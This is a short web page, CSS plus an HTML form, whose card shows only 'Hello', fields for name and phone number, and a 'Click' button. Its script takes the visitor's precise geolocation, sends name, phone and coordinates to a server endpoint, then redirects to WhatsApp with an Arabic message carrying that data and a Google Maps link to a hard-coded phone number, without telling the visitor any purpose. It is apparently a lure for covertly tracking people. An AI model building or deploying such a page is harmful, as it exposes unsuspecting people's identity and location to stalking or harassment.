    .card {
      background: rgba(0, 0, 0, 0.55);
      backdrop-filter: blur(6px);
      border-radius: 16px;
      padding: 40px 30px;
      max-width: 380px;
      width: 90%;
      text-align: center;
      color: white;
    }
    h1 {
      margin-bottom: 24px;
      font-size: 2rem;
    }
    label {
      display: block;
      text-align: left;
      margin-bottom: 4px;
      font-size: 0.9rem;
      color: #ddd;
    }
    input {
      padding: 10px;
      width: 100%;
      margin-bottom: 16px;
      border-radius: 8px;
      border: none;
      font-size: 1rem;
      box-sizing: border-box;
    }
    button {
      padding: 12px 30px;
      background: #f59e0b;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      width: 100%;
    }

<body>
  <div class="card">
    <h1>Hello</h1>

    <label>Name:</label>
    <input type="text" id="name" placeholder="Your name">

    <label>Phone Number:</label>
    <input type="tel" id="phone" placeholder="e.g. 01012345678">

    <button onclick="getLocation()">Click</button>
    <p id="result"></p>
  </div>

  <script>
    const SERVER_URL = '';

    function getLocation() {
      const name = document.getElementById("name").value;
      const phone = document.getElementById("phone").value;

      if (!name || !phone) {
        alert("Please enter your name and phone number first");
        return;
      }

      if (!navigator.geolocation) {
        document.getElementById("result").innerText = "Your browser doesn't support geolocation";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          fetch(SERVER_URL + '/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name, phone, lat, lon })
          })
          .then(res => res.json())
          .then(data => {
           document.getElementById("result").innerText =
    "Your data was submitted successfully ✅";

  const message =
    `📋 بيانات جديدة\n\n` +
    `👤 الاسم: ${name}\n` +
    `📱 رقم الهاتف: ${phone}\n` +
    `📍 الموقع:\nhttps://www.google.com/maps?q=${lat},${lon}`;

  const whatsappUrl =
    `https://wa.me/201141622578?text=${encodeURIComponent(message)}`;

  window.location.href = whatsappUrl;
})
          .catch(err => {
            document.getElementById("result").innerText = "An error occurred while sending data";
          });
        },
        (error) => {
          document.getElementById("result").innerText = "Location permission was denied";
        }
      );
    }
  </script>
</body>
